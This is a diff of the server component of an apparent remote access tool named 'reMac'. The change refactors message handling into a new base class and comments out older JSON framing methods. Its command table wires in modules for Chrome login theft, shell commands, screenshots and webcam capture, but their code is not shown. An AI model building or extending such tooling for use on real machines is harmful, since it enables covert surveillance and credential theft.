@@ -4,8 +4,6 @@
 
 import sys
 import selectors
-import json
-import io
 import struct
 
 from modules import mod_hello
@@ -15,6 +13,9 @@ from modules import mod_chrome_logins
 from modules import mod_shellcmd
 from modules import mod_screenshot
 from modules import mod_webcam
+
+from apps.libs.reMac_libbase import reMac_libbase
+# from reMac_libbase import reMac_libbase
 
 reMacModules = {
     'hw': mod_hello.mod_hello(),
@@ -26,11 +27,12 @@ reMacModules = {
     'wc': mod_webcam.mod_webcam()
 }
 
-class Message:
+class reMac_libserver(reMac_libbase):
     def __init__(self, selector, sock, addr):
-        self.selector = selector
-        self.sock = sock
-        self.addr = addr
+        reMac_libbase.__init__(self, selector, sock, addr)
+        # self.selector = selector
+        # self.sock = sock
+        # self.addr = addr
         self._recv_buffer = b""
         self._send_buffer = b""
         self._jsonheader_len = None
@@ -38,17 +40,17 @@ class Message:
         self.request = None
         self.response_created = False
 
-    def _set_selector_events_mask(self, mode):
-        """Set selector to listen for events: mode is 'r', 'w', or 'rw'."""
-        if mode == "r":
-            events = selectors.EVENT_READ
-        elif mode == "w":
-            events = selectors.EVENT_WRITE
-        elif mode == "rw":
-            events = selectors.EVENT_READ | selectors.EVENT_WRITE
-        else:
-            raise ValueError(f"Invalid events mask mode {repr(mode)}.")
-        self.selector.modify(self.sock, events, data=self)
+    # def _set_selector_events_mask(self, mode):
+    #     """Set selector to listen for events: mode is 'r', 'w', or 'rw'."""
+    #     if mode == "r":
+    #         events = selectors.EVENT_READ
+    #     elif mode == "w":
+    #         events = selectors.EVENT_WRITE
+    #     elif mode == "rw":
+    #         events = selectors.EVENT_READ | selectors.EVENT_WRITE
+    #     else:
+    #         raise ValueError(f"Invalid events mask mode {repr(mode)}.")
+    #     self.selector.modify(self.sock, events, data=self)
 
     def _read(self):
         try:
@@ -78,16 +80,16 @@ class Message:
                 if sent and not self._send_buffer:
                     self.close()
 
-    def _json_encode(self, obj, encoding):
-        return json.dumps(obj, ensure_ascii=False).encode(encoding)
-
-    def _json_decode(self, json_bytes, encoding):
-        tiow = io.TextIOWrapper(
-            io.BytesIO(json_bytes), encoding=encoding, newline=""
-        )
-        obj = json.load(tiow)
-        tiow.close()
-        return obj
+    # def _json_encode(self, obj, encoding):
+    #     return json.dumps(obj, ensure_ascii=False).encode(encoding)
+    #
+    # def _json_decode(self, json_bytes, encoding):
+    #     tiow = io.TextIOWrapper(
+    #         io.BytesIO(json_bytes), encoding=encoding, newline=""
+    #     )
+    #     obj = json.load(tiow)
+    #     tiow.close()
+    #     return obj
 
     def processInput(self, input):
         if input == "q":  # or input == "quit":
@@ -118,19 +120,19 @@ class Message:
             print(f"Command '{input}' NOT FOUND! Check the following command list")
             # print_help()
 
-    def _create_message(
-        self, *, content_bytes, content_type, content_encoding
-    ):
-        jsonheader = {
-            "byteorder": sys.byteorder,
-            "content-type": content_type,
-            "content-encoding": content_encoding,
-            "content-length": len(content_bytes),
-        }
-        jsonheader_bytes = self._json_encode(jsonheader, "utf-8")
-        message_hdr = struct.pack(">H", len(jsonheader_bytes))
-        message = message_hdr + jsonheader_bytes + content_bytes
-        return message
+    # def _create_message(
+    #     self, *, content_bytes, content_type, content_encoding
+    # ):
+    #     jsonheader = {
+    #         "byteorder": sys.byteorder,
+    #         "content-type": content_type,
+    #         "content-encoding": content_encoding,
+    #         "content-length": len(content_bytes),
+    #     }
+    #     jsonheader_bytes = self._json_encode(jsonheader, "utf-8")
+    #     message_hdr = struct.pack(">H", len(jsonheader_bytes))
+    #     message = message_hdr + jsonheader_bytes + content_bytes
+    #     return message
 
     def _create_response_json_content(self):
         action = self.request.get("action")
